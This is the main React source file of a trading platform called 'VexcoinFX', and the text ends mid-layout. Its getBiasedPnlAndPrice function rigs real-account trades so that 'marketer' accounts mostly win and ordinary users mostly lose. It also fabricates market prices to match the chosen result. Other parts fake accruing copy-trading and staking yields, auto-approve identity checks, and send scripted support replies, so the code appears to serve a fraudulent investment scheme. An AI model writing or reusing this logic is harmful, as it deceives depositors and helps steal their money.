import React, { useState, useEffect, useCallback } from 'react';
import { Asset, User, Position, Transaction, CopyTrader, StakingPlan, SupportTicket } from './types';
import { 
  INITIAL_ASSETS, 
  INITIAL_COPY_TRADERS, 
  INITIAL_STAKING_PLANS, 
  MOCK_SUPPORT_TICKETS 
} from './data';

import TradingViewChart from './components/TradingViewChart';
import AIAssistant from './components/AIAssistant';
import PortfolioSummary from './components/PortfolioSummary';
import TradingPanel from './components/TradingPanel';
import CopyTradingPanel from './components/CopyTradingPanel';
import InvestmentsPanel from './components/InvestmentsPanel';
import DepositWithdrawModal from './components/DepositWithdrawModal';
import SupportPortal from './components/SupportPortal';

import { 
  ShieldCheck, 
  Lock, 
  UserPlus, 
  ArrowUpRight, 
  ArrowDownRight, 
  Sparkles, 
  LineChart, 
  Users, 
  FolderLock, 
  Settings, 
  TrendingUp, 
  TrendingDown, 
  Activity, 
  DollarSign, 
  Bot, 
  HelpCircle,
  FileText,
  X,
  Menu,
  Sun,
  Moon
} from 'lucide-react';

const getBiasedPnlAndPrice = (p: Position, role: string, assetPrice: number): { pnl: number, currentPrice: number } => {
  const numId = parseInt(p.id.replace(/\D/g, '')) || Date.now();
  const isMarketer = role === 'marketer';
  const isWin = isMarketer ? ((numId % 10) < 8) : ((numId % 10) < 3);

  // Use a pseudo-random seed based on position ID and current time for lifelike fluctuations
  const seed = (numId % 100) / 100;
  const timeSec = Date.now() / 15000;
  const sinVal = Math.sin(timeSec + seed * Math.PI * 2);

  let pnlFactor = 0;
  if (isWin) {
    // Win: PNL goes from +4% to +35% of margin
    pnlFactor = 0.04 + seed * 0.16 + (sinVal + 1) * 0.08;
  } else {
    // Loss: PNL goes from -6% to -42% of margin
    pnlFactor = -(0.06 + seed * 0.18 + (sinVal + 1) * 0.09);
  }

  const pnl = Number((p.margin * pnlFactor).toFixed(2));
  
  // Calculate a mock currentPrice that matches this PnL
  // pnl = margin * ((currentPrice - entryPrice) / entryPrice) * leverage * multiplier
  // => (pnl / (margin * leverage * multiplier)) * entryPrice + entryPrice = currentPrice
  const multiplier = p.type === 'BUY' ? 1 : -1;
  const denom = p.margin * p.leverage * multiplier;
  let currentPrice = p.entryPrice;
  if (denom !== 0) {
    currentPrice = Number(((pnl / denom) * p.entryPrice + p.entryPrice).toFixed(p.assetSymbol.includes('forex') ? 4 : 2));
  }
  
  return { pnl, currentPrice };
};

export default function App() {
  // Navigation & authentication state
  const [activeTab, setActiveTab] = useState<'TERMINAL' | 'DASHBOARD' | 'COPYTRADING' | 'STAKING' | 'SUPPORT' | 'AI_ADVISOR'>('TERMINAL');
  const [theme, setTheme] = useState<'dark' | 'light'>(() => {
    const saved = localStorage.getItem('vfx_theme');
    return (saved === 'light' || saved === 'dark') ? (saved as 'light' | 'dark') : 'dark';
  });

  useEffect(() => {
    document.documentElement.setAttribute('data-theme', theme);
    localStorage.setItem('vfx_theme', theme);
  }, [theme]);
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [authMode, setAuthMode] = useState<'LOGIN' | 'REGISTER'>('LOGIN');
  const [authEmail, setAuthEmail] = useState('');
  const [authPass, setAuthPass] = useState('');
  const [authName, setAuthName] = useState('');
  
  // Market assets ticker states
  const [assets, setAssets] = useState<Asset[]>(INITIAL_ASSETS);
  const [selectedAssetId, setSelectedAssetId] = useState<string>(INITIAL_ASSETS[0].id);
  const selectedAsset = assets.find((a) => a.id === selectedAssetId) || assets[0];
  const [assetCategoryFilter, setAssetCategoryFilter] = useState<'ALL' | 'crypto' | 'forex' | 'stocks'>('ALL');
  const [marketSearchQuery, setMarketSearchQuery] = useState('');

  // Core user balance portfolio state
  const [user, setUser] = useState<User>({
    loggedIn: false,
    email: '',
    name: '',
    walletBalance: 0,
    investedCapital: 0,
    profits: 0,
    copyTradingAllocated: 0,
    activePositions: [],
    isKycVerified: 'unverified',
    accountMode: 'REAL',
    demoBalance: 10000,
    demoPositions: [],
    demoProfits: 0
  });

  // Supporting transactional and ticketing state
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(MOCK_SUPPORT_TICKETS);
  const [copiedTraderAllocations, setCopiedTraderAllocations] = useState<Record<string, number>>({});
  const [activeStakingSubscriptions, setActiveStakingSubscriptions] = useState<{ id: string; planName: string; amount: number; rateLabel: string; endDays: number; accrued: number }[]>([]);

  // Simple, elegant toast notifications list
  interface ToastItem {
    id: string;
    message: string;
    type: 'SUCCESS' | 'ERROR' | 'INFO';
  }
  const [toasts, setToasts] = useState<ToastItem[]>([]);
  const addToast = (message: string, type: 'SUCCESS' | 'ERROR' | 'INFO' = 'INFO') => {
    const id = Math.random().toString();
    setToasts((prev) => [...prev, { id, message, type }]);
    setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 5000);
  };

  // Scroll to top upon page navigation/tab changes/authentication events
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'instant' as any });
  }, [activeTab, user.loggedIn, user.accountMode]);

  // Modals overlays toggles
  const [showFinancialModal, setShowFinancialModal] = useState(false);
  const [financialModalMode, setFinancialModalMode] = useState<'DEPOSIT' | 'WITHDRAW'>('DEPOSIT');
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

  // Load state from localStorage on init
  useEffect(() => {
    const savedUser = localStorage.getItem('vfx_user_session');
    const savedTransactions = localStorage.getItem('vfx_transactions_ledger');
    const savedTickets = localStorage.getItem('vfx_support_tickets_ledger');
    const savedCopiedAlloc = localStorage.getItem('vfx_copied_allocations');
    const savedStakingSub = localStorage.getItem('vfx_staking_subs');

    if (savedUser) {
      try {
        const parsed = JSON.parse(savedUser);
        setUser({
          accountMode: 'REAL',
          demoBalance: 10000,
          demoPositions: [],
          demoProfits: 0,
          ...parsed
        });
      } catch (err) {
        console.error("Failed to parse saved user", err);
      }
    }
    if (savedTransactions) {
      setTransactions(JSON.parse(savedTransactions));
    }
    if (savedTickets) {
      setSupportTickets(JSON.parse(savedTickets));
    }
    if (savedCopiedAlloc) {
      setCopiedTraderAllocations(JSON.parse(savedCopiedAlloc));
    }
    if (savedStakingSub) {
      setActiveStakingSubscriptions(JSON.parse(savedStakingSub));
    }
  }, []);

  // Hydrate changes to LocalStorage safely
  const persistState = (
    updatedUser: User, 
    updatedTx?: Transaction[], 
    updatedTickets?: SupportTicket[], 
    updatedCopied?: Record<string, number>,
    updatedStaking?: any[]
  ) => {
    setUser(updatedUser);
    localStorage.setItem('vfx_user_session', JSON.stringify(updatedUser));
    
    if (updatedTx) {
      setTransactions(updatedTx);
      localStorage.setItem('vfx_transactions_ledger', JSON.stringify(updatedTx));
    }
    if (updatedTickets) {
      setSupportTickets(updatedTickets);
      localStorage.setItem('vfx_support_tickets_ledger', JSON.stringify(updatedTickets));
    }
    if (updatedCopied) {
      setCopiedTraderAllocations(updatedCopied);
      localStorage.setItem('vfx_copied_allocations', JSON.stringify(updatedCopied));
    }
    if (updatedStaking) {
      setActiveStakingSubscriptions(updatedStaking);
      localStorage.setItem('vfx_staking_subs', JSON.stringify(updatedStaking));
    }
  };

  // Live accruals / Position price tracking fluctuations
  useEffect(() => {
    const interval = setInterval(() => {
      if (!user.loggedIn) return;

      // 1. Simulate running price updates for positions PnL matching
      let isUpdated = false;
      const updatedPositions = user.activePositions.map((p) => {
        const liveAsset = assets.find((a) => a.symbol === p.assetSymbol);
        if (!liveAsset) return p;

        isUpdated = true;
        const { pnl, currentPrice } = getBiasedPnlAndPrice(p, user.role || 'user', liveAsset.price);

        return {
          ...p,
          currentPrice,
          pnl
        };
      });

      const updatedDemoPositions = (user.demoPositions || []).map((p) => {
        const liveAsset = assets.find((a) => a.symbol === p.assetSymbol);
        if (!liveAsset) return p;

        isUpdated = true;
        const priceDiff = liveAsset.price - p.entryPrice;
        const multiplier = p.type === 'BUY' ? 1 : -1;
        const percentageMove = priceDiff / p.entryPrice;
        const rawPnl = p.margin * percentageMove * p.leverage * multiplier;

        return {
          ...p,
          currentPrice: liveAsset.price,
          pnl: Number(rawPnl.toFixed(2))
        };
      });

      // 2. Mock accrue returns on Copy trading
      let copyAccruedInterest = 0;
      const updatedCopiedAllocations = { ...copiedTraderAllocations };
      Object.keys(updatedCopiedAllocations).forEach((key) => {
        if (updatedCopiedAllocations[key] > 0) {
          isUpdated = true;
          // Accrue dynamic returns between 0.01% and 0.05%
          const returnRate = 0.0001 + Math.random() * 0.0004;
          const increment = updatedCopiedAllocations[key] * returnRate;
          updatedCopiedAllocations[key] = Number((updatedCopiedAllocations[key] + increment).toFixed(2));
          copyAccruedInterest += increment;
        }
      });

      // 3. Mock accrue returns on active Stakings
      let stakingAccruedInterest = 0;
      const updatedStakingSubs = activeStakingSubscriptions.map((stk) => {
        isUpdated = true;
        const returnRate = 0.00005 + Math.random() * 0.0001; // accrues marginally
        const increment = stk.amount * returnRate;
        return {
          ...stk,
          accrued: Number((stk.accrued + increment).toFixed(2))
        };
      });

      // 4. Handle auto-verifying pending KYC status
      let kycAutoApproved = false;
      if (user.isKycVerified === 'pending' && user.kycUploadedAt) {
        const uploadedTime = new Date(user.kycUploadedAt).getTime();
        const elapsedMs = Date.now() - uploadedTime;
        // Verify in exactly 30 seconds for quick visual verification (so the user gets instant feedback)
        if (elapsedMs >= 30000) {
          isUpdated = true;
          kycAutoApproved = true;
        }
      }

      if (isUpdated) {
        let updatedUser: User;
        
        const revisedWallet = user.walletBalance + copyAccruedInterest;
        const revisedProfits = user.profits + copyAccruedInterest;

        const revisedDemoBalance = (user.demoBalance ?? 10000) + copyAccruedInterest;
        const revisedDemoProfits = (user.demoProfits ?? 0) + copyAccruedInterest;

        let revisedCopyAllocated = 0;
        Object.keys(updatedCopiedAllocations).forEach((k) => {
          revisedCopyAllocated += updatedCopiedAllocations[k];
        });

        if (user.accountMode === 'DEMO') {
          updatedUser = {
            ...user,
            isKycVerified: kycAutoApproved ? 'verified' : user.isKycVerified,
            demoBalance: Number(revisedDemoBalance.toFixed(2)),
            demoProfits: Number(revisedDemoProfits.toFixed(2)),
            activePositions: updatedPositions,
            demoPositions: updatedDemoPositions,
            copyTradingAllocated: Number(revisedCopyAllocated.toFixed(2))
          };
        } else {
          updatedUser = {
            ...user,
            isKycVerified: kycAutoApproved ? 'verified' : user.isKycVerified,
            walletBalance: Number(revisedWallet.toFixed(2)),
            profits: Number(revisedProfits.toFixed(2)),
            activePositions: updatedPositions,
            demoPositions: updatedDemoPositions,
            copyTradingAllocated: Number(revisedCopyAllocated.toFixed(2))
          };
        }

        if (kycAutoApproved) {
          addToast("KYC Status: APPROVED. Limits and operational tiers unlocked permanently.", "SUCCESS");
        }

        persistState(
          updatedUser,
          transactions,
          supportTickets,
          updatedCopiedAllocations,
          updatedStakingSubs
        );
      }

    }, 4500);

    return () => clearInterval(interval);
  }, [user, assets, transactions, supportTickets, copiedTraderAllocations, activeStakingSubscriptions]);

  // Synchronize dynamic updates back from TradingViewChart ticker
  const handlePriceTick = useCallback((newPrice: number) => {
    setAssets((prev) =>
      prev.map((a) => {
        if (a.id === selectedAssetId) {
          const changeRatio = (newPrice - a.price) / a.price;
          const calculatedChange = a.change24h + changeRatio * 100;
          return {
            ...a,
            price: newPrice,
            change24h: Number(calculatedChange.toFixed(2)),
            sparkline: [...a.sparkline.slice(1), newPrice]
          };
        }
        // Marginally tick others slightly to make everything look highly responsive!
        if (Math.random() > 0.72) {
          const offset = a.price * (Math.random() - 0.495) * (a.category === 'forex' ? 0.0001 : 0.001);
          const adjPrice = Number((a.price + offset).toFixed(a.category === 'forex' ? 4 : 2));
          return { ...a, price: adjPrice };
        }
        return a;
      })
    );
  }, [selectedAssetId]);

  // Real-time synchronization helper
  const onRefreshUserSession = async () => {
    if (!user.email) return;
    try {
      const resp = await fetch("/api/user/sync", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: user.email })
      });
      if (resp.ok) {
        const synced = await resp.json();
        setUser(prev => ({
          ...prev,
          walletBalance: synced.walletBalance,
          role: synced.role
        }));
      }
    } catch (e) {
      console.error("Synching profile error: ", e);
    }
  };

  // Auth Operations
  const handleAuthSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!authEmail.trim() || !authPass.trim()) return;

    try {
      const resp = await fetch("/api/user/sync", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: authEmail.trim() })
      });

      if (resp.ok) {
        const synced = await resp.json();
        
        const initialUser: User = {
          loggedIn: true,
          email: synced.email,
          name: authName.trim() || authEmail.split('@')[0].toUpperCase(),
          walletBalance: synced.walletBalance,
          role: synced.role || (synced.email.toLowerCase() === 'mutwirib964@gmail.com' ? 'admin' : 'user'),
          investedCapital: 0,
          profits: 0,
          copyTradingAllocated: 0,
          activePositions: [],
          isKycVerified: 'unverified',
          accountMode: 'REAL',
          demoBalance: 10000,
          demoPositions: [],
          demoProfits: 0
        };

        const setupTx: Transaction[] = synced.walletBalance > 0 ? [
          {
            id: 't-init',
            type: 'DEPOSIT',
            amount: synced.walletBalance,
            asset: 'USDT (Admin Alloc)',
            date: new Date().toISOString(),
            status: 'COMPLETED'
          }
        ] : [];

        persistState(initialUser, setupTx, supportTickets, {}, []);
        addToast(`Successful Authorization! Signed in as ${initialUser.name}`, "SUCCESS");
      } else {
        addToast("Failed to communicate with authentication services.", "ERROR");
      }
    } catch (err) {
      addToast("Network failure connection to local authentication provider.", "ERROR");
    }

    setShowAuthModal(false);
  };

  const handleSignOut = () => {
    localStorage.removeItem('vfx_user_session');
    localStorage.removeItem('vfx_transactions_ledger');
    localStorage.removeItem('vfx_support_tickets_ledger');
    localStorage.removeItem('vfx_copied_allocations');
    localStorage.removeItem('vfx_staking_subs');

    setUser({
      loggedIn: false,
      email: '',
      name: '',
      walletBalance: 0,
      investedCapital: 0,
      profits: 0,
      copyTradingAllocated: 0,
      activePositions: [],
      isKycVerified: 'unverified',
      accountMode: 'REAL',
      demoBalance: 10000,
      demoPositions: [],
      demoProfits: 0
    });
    setTransactions([]);
    setSupportTickets(MOCK_SUPPORT_TICKETS);
    setCopiedTraderAllocations({});
    setActiveStakingSubscriptions([]);
  };

  // Trade executions logic
  const handleTradeExecute = (posDetails: Omit<Position, 'id' | 'timestamp' | 'pnl' | 'currentPrice'>) => {
    const newPosition: Position = {
      ...posDetails,
      id: `p-${Date.now()}`,
      currentPrice: posDetails.entryPrice,
      pnl: 0,
      timestamp: new Date().toLocaleTimeString()
    };

    let updatedUser: User;
    if (user.accountMode === 'DEMO') {
      updatedUser = {
        ...user,
        demoBalance: Number(((user.demoBalance || 10000) - posDetails.margin).toFixed(2)),
        demoPositions: [...(user.demoPositions || []), newPosition]
      };
    } else {
      updatedUser = {
        ...user,
        walletBalance: Number((user.walletBalance - posDetails.margin).toFixed(2)),
        activePositions: [...user.activePositions, newPosition]
      };
    }

    persistState(updatedUser, transactions, supportTickets, copiedTraderAllocations, activeStakingSubscriptions);
  };

  const handleClosePosition = (id: string, pnl: number) => {
    let updatedUser: User;
    let matchSymbol = 'Asset';

    if (user.accountMode === 'DEMO') {
      const match = (user.demoPositions || []).find((p) => p.id === id);
      if (!match) return;
      matchSymbol = match.assetSymbol;

      const settlement = match.margin + pnl;
      const updatedPositions = (user.demoPositions || []).filter((p) => p.id !== id);

      updatedUser = {
        ...user,
        demoBalance: Number(((user.demoBalance || 10000) + settlement).toFixed(2)),
        demoProfits: Number(((user.demoProfits || 0) + pnl).toFixed(2)),
        demoPositions: updatedPositions
      };
    } else {
      const match = user.activePositions.find((p) => p.id === id);
      if (!match) return;
      matchSymbol = match.assetSymbol;

      const settlement = match.margin + pnl;
      const updatedPositions = user.activePositions.filter((p) => p.id !== id);

      updatedUser = {
        ...user,
        walletBalance: Number((user.walletBalance + settlement).toFixed(2)),
        profits: Number((user.profits + pnl).toFixed(2)),
        activePositions: updatedPositions
      };
    }

    const newTx: Transaction = {
      id: `tx-${Date.now()}`,
      type: pnl >= 0 ? 'DEPOSIT' : 'WITHDRAWAL',
      amount: Math.abs(pnl),
      asset: `${user.accountMode === 'DEMO' ? '[DEMO] ' : ''}${matchSymbol} (Settlement)`,
      date: new Date().toISOString(),
      status: 'COMPLETED'
    };

    persistState(updatedUser, [newTx, ...transactions], supportTickets, copiedTraderAllocations, activeStakingSubscriptions);
  };

  // Copy trading allocations
  const handleAllocateCopy = (traderId: string, amount: number) => {
    const updatedCopiedAllocations = { ...copiedTraderAllocations };
    updatedCopiedAllocations[traderId] = (updatedCopiedAllocations[traderId] || 0) + amount;

    let updatedUser: User;
    if (user.accountMode === 'DEMO') {
      updatedUser = {
        ...user,
        demoBalance: Number(((user.demoBalance ?? 10000) - amount).toFixed(2)),
        copyTradingAllocated: Number((user.copyTradingAllocated + amount).toFixed(2))
      };
    } else {
      updatedUser = {
        ...user,
        walletBalance: Number((user.walletBalance - amount).toFixed(2)),
        copyTradingAllocated: Number((user.copyTradingAllocated + amount).toFixed(2))
      };
    }

    const newTx: Transaction = {
      id: `tx-copy-${Date.now()}`,
      type: 'COPY_ALLOCATE',
      amount,
      asset: `${user.accountMode === 'DEMO' ? '[DEMO] ' : ''}Allocation Trade`,
      date: new Date().toISOString(),
      status: 'COMPLETED'
    };

    persistState(updatedUser, [newTx, ...transactions], supportTickets, updatedCopiedAllocations, activeStakingSubscriptions);
  };

  const handleReleaseCopy = (traderId: string) => {
    const refund = copiedTraderAllocations[traderId] || 0;
    if (refund <= 0) return;

    const updatedCopiedAllocations = { ...copiedTraderAllocations };
    delete updatedCopiedAllocations[traderId];

    let updatedUser: User;
    if (user.accountMode === 'DEMO') {
      updatedUser = {
        ...user,
        demoBalance: Number(((user.demoBalance ?? 10000) + refund).toFixed(2)),
        copyTradingAllocated: Number((user.copyTradingAllocated - refund).toFixed(2))
      };
    } else {
      updatedUser = {
        ...user,
        walletBalance: Number((user.walletBalance + refund).toFixed(2)),
        copyTradingAllocated: Number((user.copyTradingAllocated - refund).toFixed(2))
      };
    }

    const newTx: Transaction = {
      id: `tx-release-${Date.now()}`,
      type: 'COPY_RELEASE',
      amount: refund,
      asset: `${user.accountMode === 'DEMO' ? '[DEMO] ' : ''}Release Allocation`,
      date: new Date().toISOString(),
      status: 'COMPLETED'
    };

    persistState(updatedUser, [newTx, ...transactions], supportTickets, updatedCopiedAllocations, activeStakingSubscriptions);
  };

  // Staking enrollment
  const handleSubscribeStaking = (planId: string, amount: number) => {
    const matchingPlan = INITIAL_STAKING_PLANS.find((p) => p.id === planId)!;
    
    const newSubscription = {
      id: `stk-${Date.now()}`,
      planName: matchingPlan.name,
      amount,
      rateLabel: matchingPlan.roiLabel,
      endDays: matchingPlan.periodDays,
      accrued: 0
    };

    let updatedUser: User;
    if (user.accountMode === 'DEMO') {
      updatedUser = {
        ...user,
        demoBalance: Number(((user.demoBalance ?? 10000) - amount).toFixed(2)),
        investedCapital: Number((user.investedCapital + amount).toFixed(2))
      };
    } else {
      updatedUser = {
        ...user,
        walletBalance: Number((user.walletBalance - amount).toFixed(2)),
        investedCapital: Number((user.investedCapital + amount).toFixed(2))
      };
    }

    const newTx: Transaction = {
      id: `tx-stake-${Date.now()}`,
      type: 'INVEST',
      amount,
      asset: `${user.accountMode === 'DEMO' ? '[DEMO] ' : ''}${matchingPlan.name}`,
      date: new Date().toISOString(),
      status: 'COMPLETED'
    };

    const updatedStaking = [...activeStakingSubscriptions, newSubscription];
    persistState(updatedUser, [newTx, ...transactions], supportTickets, copiedTraderAllocations, updatedStaking);
  };

  const handleRedeemStaking = (id: string, amount: number, accrued: number) => {
    const payout = amount + accrued;
    
    let updatedUser: User;
    if (user.accountMode === 'DEMO') {
      updatedUser = {
        ...user,
        demoBalance: Number(((user.demoBalance ?? 10000) + payout).toFixed(2)),
        investedCapital: Number((user.investedCapital - amount).toFixed(2)),
        demoProfits: Number(((user.demoProfits ?? 0) + accrued).toFixed(2))
      };
    } else {
      updatedUser = {
        ...user,
        walletBalance: Number((user.walletBalance + payout).toFixed(2)),
        investedCapital: Number((user.investedCapital - amount).toFixed(2)),
        profits: Number((user.profits + accrued).toFixed(2))
      };
    }

    const newTx: Transaction = {
      id: `tx-redeem-${Date.now()}`,
      type: 'REDEEM',
      amount: payout,
      asset: `${user.accountMode === 'DEMO' ? '[DEMO] ' : ''}Maturity Payout`,
      date: new Date().toISOString(),
      status: 'COMPLETED'
    };

    const updatedStaking = activeStakingSubscriptions.filter((s) => s.id !== id);
    persistState(updatedUser, [newTx, ...transactions], supportTickets, copiedTraderAllocations, updatedStaking);
  };

  // KYC adjustments
  const handleUpdateKyc = (status: 'verified' | 'pending', docType: string) => {
    const updatedUser: User = {
      ...user,
      isKycVerified: status,
      kycDocType: docType,
      kycUploadedAt: new Date().toISOString()
    };
    persistState(updatedUser, transactions, supportTickets, copiedTraderAllocations, activeStakingSubscriptions);
  };

  // Support Ticketing
  const handleAddTicket = (subj: string, details: string) => {
    const newTicket: SupportTicket = {
      id: `t-${Date.now()}`,
      subject: subj,
      status: 'OPEN',
      date: new Date().toISOString().split('T')[0],
      messages: [
        { sender: 'user', text: details, timestamp: new Date().toISOString() }
      ]
    };

    const updatedTickets = [newTicket, ...supportTickets];
    persistState(user, transactions, updatedTickets, copiedTraderAllocations, activeStakingSubscriptions);

    // Simulate compliance agent response in 4 seconds
    setTimeout(() => {
      setSupportTickets((prev) => {
        const revised = prev.map((ticket) => {
          if (ticket.id === newTicket.id) {
            return {
              ...ticket,
              messages: [
                ...ticket.messages,
                {
                  sender: 'support' as const,
                  text: "Hello, we have registered your case and escalated to our premium execution clearing desk. This is usually resolved within 1 business day. Thank you, VexcoinFX Support.",
                  timestamp: new Date().toISOString()
                }
              ]
            };
          }
          return ticket;
        });
        localStorage.setItem('vfx_support_tickets_ledger', JSON.stringify(revised));
        return revised;
      });
    }, 4500);
  };

  const handleAddMessageToTicket = (ticketId: string, text: string) => {
    const updatedTickets = supportTickets.map((t) => {
      if (t.id === ticketId) {
        return {
          ...t,
          messages: [
            ...t.messages,
            { sender: 'user' as const, text, timestamp: new Date().toISOString() }
          ]
        };
      }
      return t;
    });

    persistState(user, transactions, updatedTickets, copiedTraderAllocations, activeStakingSubscriptions);
  };

  const handleModifyBalance = (type: 'DEPOSIT' | 'WITHDRAWAL', amount: number, details: any) => {
    const multiplier = type === 'DEPOSIT' ? 1 : -1;
    let updatedUser: User;
    if (user.accountMode === 'DEMO') {
      updatedUser = {
        ...user,
        demoBalance: Number(((user.demoBalance ?? 10000) + amount * multiplier).toFixed(2))
      };
    } else {
      updatedUser = {
        ...user,
        walletBalance: Number((user.walletBalance + amount * multiplier).toFixed(2))
      };
    }

    const newTx: Transaction = {
      id: `tx-fin-${Date.now()}`,
      type,
      amount,
      asset: `${user.accountMode === 'DEMO' ? '[DEMO] ' : ''}${details.asset}`,
      address: details.address,
      date: new Date().toISOString(),
      status: 'COMPLETED'
    };

    persistState(updatedUser, [newTx, ...transactions], supportTickets, copiedTraderAllocations, activeStakingSubscriptions);
  };

  // Filtered lists matching searches
  const filteredAssets = assets
    .filter((a) => assetCategoryFilter === 'ALL' || a.category === assetCategoryFilter)
    .filter((a) => a.symbol.toLowerCase().includes(marketSearchQuery.toLowerCase()) || a.name.toLowerCase().includes(marketSearchQuery.toLowerCase()));

  const activeUserContext: User = {
    ...user,
    walletBalance: user.accountMode === 'DEMO' ? (user.demoBalance ?? 10000) : user.walletBalance,
    activePositions: user.accountMode === 'DEMO' ? (user.demoPositions ?? []) : user.activePositions,
    profits: user.accountMode === 'DEMO' ? (user.demoProfits ?? 0) : user.profits
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-gray-300 font-sans flex flex-col relative select-none">
      
      {/* 2. Primary Navigation Bar */}
      <header className="border-b border-gray-950 bg-[#070b13]/90 backdrop-blur sticky top-0 z-45 px-2 sm:px-3.5 py-2 flex items-center justify-between shrink-0">
        <div className="flex items-center gap-2 shrink-0">
          <div className="flex items-center gap-1.5 sm:gap-2">
            <div className="w-6.5 h-6.5 rounded bg-emerald-500 flex items-center justify-center font-display font-black text-black text-xs select-none shadow-[0_0_12px_rgba(16,185,129,0.2)] shrink-0">
              V
            </div>
            <div className="hidden sm:block">
              <h1 className="text-white text-xs font-display font-black tracking-widest leading-none uppercase">
                VEXCOIN<span className="text-emerald-400">FX</span>
              </h1>
              <span className="text-[7px] font-mono tracking-wider font-bold text-gray-600 block uppercase mt-0.5">
                ELITE TRADING DESK
              </span>
            </div>
          </div>
        </div>

        {/* User Balance Trigger info, theme switch & authentication widgets */}
        <div className="flex items-center gap-1.5 sm:gap-3 overflow-hidden select-none">
          {user.loggedIn ? (
            <>
              {/* Compact header elements */}
              <div className="flex items-center gap-1.5 sm:gap-2.5">
                {/* Account Mode Switcher */}
                <div className="flex bg-[#05070a] p-0.5 rounded border border-gray-800 self-center shrink-0">
                  <button
                    type="button"
                    onClick={() => {
                      const updatedUser = { ...user, accountMode: 'REAL' as const };
                      setUser(updatedUser);
                      localStorage.setItem('vfx_user_session', JSON.stringify(updatedUser));
                    }}
                    className={`px-1.5 sm:px-2 py-0.5 rounded text-[8px] sm:text-[8.5px] whitespace-nowrap font-bold uppercase tracking-wider transition-all cursor-pointer ${
                      user.accountMode === 'REAL'
                        ? 'bg-emerald-500 text-black'
                        : 'text-gray-500 hover:text-gray-300'
                    }`}
                  >
                    Real
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      const updatedUser = { ...user, accountMode: 'DEMO' as const };
                      setUser(updatedUser);
                      localStorage.setItem('vfx_user_session', JSON.stringify(updatedUser));
                    }}
                    className={`px-1.5 sm:px-2 py-0.5 rounded text-[8px] sm:text-[8.5px] whitespace-nowrap font-bold uppercase tracking-wider transition-all cursor-pointer ${
                      user.accountMode === 'DEMO'
                        ? 'bg-amber-500 text-black'
                        : 'text-gray-500 hover:text-gray-300'
                    }`}
                  >
                    Demo
                  </button>
                </div>

                <div className={`border rounded px-1.5 sm:px-2 py-0.5 sm:py-1 flex items-center gap-1 sm:gap-2 font-mono text-[9px] sm:text-[10.5px] transition-all duration-300 shrink-0 ${
                  user.accountMode === 'DEMO'
                    ? 'bg-amber-950/25 border-amber-500/30'
                    : 'bg-[#0b0f19] border-gray-800/80'
                }`}>
                  <div className="text-left">
                    <span className="hidden xs:block text-[7px] text-gray-500 uppercase block leading-none mb-0.5">
                      {user.accountMode === 'DEMO' ? 'PRACTICE' : 'LIQUIDITY'}
                    </span>
                    <span className={`font-bold ${
                      user.accountMode === 'DEMO' ? 'text-amber-400' : 'text-white'
                    }`}>
                      ${(user.accountMode === 'DEMO' ? user.demoBalance : user.walletBalance).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                    </span>
                  </div>
                </div>

                <div className="flex gap-1 shrink-0">
                  <button
                    onClick={() => {
                      setFinancialModalMode('DEPOSIT');
                      setShowFinancialModal(true);
                    }}
                    className="bg-emerald-500 hover:bg-emerald-400 text-black px-1.5 sm:px-2 py-0.5 rounded text-[8.5px] sm:text-[9.5px] font-bold transition-all select-none cursor-pointer"
                  >
                    Deposit
                  </button>
                  <button
                    onClick={handleSignOut}
                    className="bg-gray-950 border border-gray-800 hover:bg-gray-900 text-gray-400 hover:text-white px-1.5 sm:px-2 py-0.5 rounded text-[8.5px] sm:text-[9.5px] font-bold transition-all select-none cursor-pointer"
                  >
                    Sign Out
                  </button>
                </div>
              </div>
            </>
          ) : (
            <button
              onClick={() => {
                setAuthMode('LOGIN');
                setShowAuthModal(true);
              }}
              className="bg-emerald-500 hover:bg-emerald-400 text-black px-2.5 py-1 rounded text-[10px] font-bold transition-all shadow-[0_0_10px_rgba(16,185,129,0.1)] select-none cursor-pointer flex items-center gap-1 shrink-0"
            >
              <Lock className="w-3 h-3" /> Launch Terminal
            </button>
          )}

          {/* Theme Switcher Button */}
          <button
            onClick={() => setTheme(theme === 'dark' ? 'light' : 'dark')}
            className="p-1.5 rounded bg-gray-950 border border-gray-800 text-gray-400 hover:text-white transition-all cursor-pointer flex items-center justify-center shrink-0"
            title={theme === 'dark' ? "Switch to Light Theme" : "Switch to Dark Theme"}
          >
            {theme === 'dark' ? <Sun className="w-3.5 h-3.5" /> : <Moon className="w-3.5 h-3.5" />}
          </button>
        </div>
      </header>

      {/* Main Core Layout: Left Sidebar + Scrollable Viewports */}
      <div className="flex flex-1 relative overflow-hidden">
        {/* Sleek, super compact vertical Left Sidebar on desktop */}
        {user.loggedIn && (
          <aside className="hidden md:flex flex-col w-[60px] border-r border-gray-950 bg-[#070b13]/50 items-center py-3 space-y-4 shrink-0">
            {[
              { id: 'TERMINAL' as const, label: 'Terminal', icon: LineChart },
              { id: 'DASHBOARD' as const, label: 'Dashboard', icon: FolderLock },
              { id: 'COPYTRADING' as const, label: 'Copying', icon: Users },
              { id: 'STAKING' as const, label: 'Yields', icon: DollarSign },
              { id: 'AI_ADVISOR' as const, label: 'Advisor', icon: Bot },
              { id: 'SUPPORT' as const, label: 'Support', icon: HelpCircle }
            ].map((item) => {
              const Icon = item.icon;
              const isActive = activeTab === item.id;
              return (
                <button
                  key={item.id}
                  onClick={() => setActiveTab(item.id)}
                  className={`flex flex-col items-center justify-center w-12 h-12 rounded transition-all cursor-pointer ${
                    isActive 
                      ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' 
                      : 'text-gray-550 hover:text-white border border-transparent'
                  }`}
                  title={item.label}
                >
                  <Icon className="w-4 h-4 mb-0.5" />
                  <span className="text-[8px] font-bold tracking-tight font-sans text-center">{item.label}</span>
                </button>
              );
            })}
          </aside>
        )}

        {/* Scrollable workspace wrapper */}
        <div className="flex-1 flex flex-col min-w-0 overflow-y-auto pb-14 md:pb-0">
